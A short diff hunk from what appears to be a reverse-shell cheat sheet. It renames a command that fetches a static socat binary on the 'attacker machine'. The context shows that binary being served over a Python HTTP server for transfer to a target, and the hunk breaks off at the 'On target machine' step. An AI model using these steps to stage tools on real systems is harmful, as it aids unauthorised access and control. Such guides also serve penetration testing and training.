@@ -104,7 +104,7 @@ Alternatively, if target does not have `socat`:
 ```shell
 # On attacker machine
 # get socat static & expose it
-get-static socat
+static-get socat
 python3 -m http.server 8080
 
 # On target machine
